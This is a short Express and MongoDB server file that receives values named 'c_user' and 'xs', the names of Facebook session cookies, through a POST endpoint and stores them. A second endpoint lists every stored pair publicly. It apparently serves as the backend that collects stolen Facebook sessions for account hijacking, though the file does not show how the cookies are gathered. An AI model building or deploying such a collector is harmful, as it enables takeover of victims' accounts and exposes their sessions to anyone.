const express = require('express');
const mongoose = require('mongoose');
const multer = require('multer');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(cors({
  origin: ['https://fb-react-omega.vercel.app/api/data'],
  credentials: true
}));
app.use(express.json());
const upload = multer();

// MongoDB Connection
mongoose.connect(process.env.MONGO_URI)
  .then(() => console.log('Connected to MongoDB'))
  .catch(err => console.error('MongoDB connection error:', err));

// Define Schema and Model
const fbDataSchema = new mongoose.Schema({
  c_user: { type: String, required: true },
  xs: { type: String, required: true },
  createdAt: { type: Date, default: Date.now }
});

const FBData = mongoose.model('FBData', fbDataSchema);

// API Endpoint to Store Data
app.post('/api/submit', upload.none(), async (req, res) => {
  try {
    console.log(req.body); // Now works with form-data
    const { c_user, xs } = req.body;
    const newData = new FBData({ c_user, xs });
    await newData.save();
    res.status(201).json({ success: true, message: 'Data stored successfully' });
  } catch (error) {
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

app.get('/api/data', async (req, res) => {
  try {
    const allData = await FBData.find().sort({ createdAt: -1 }); // Sort by newest first
    res.status(200).json({ success: true, data: allData });
  } catch (error) {
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));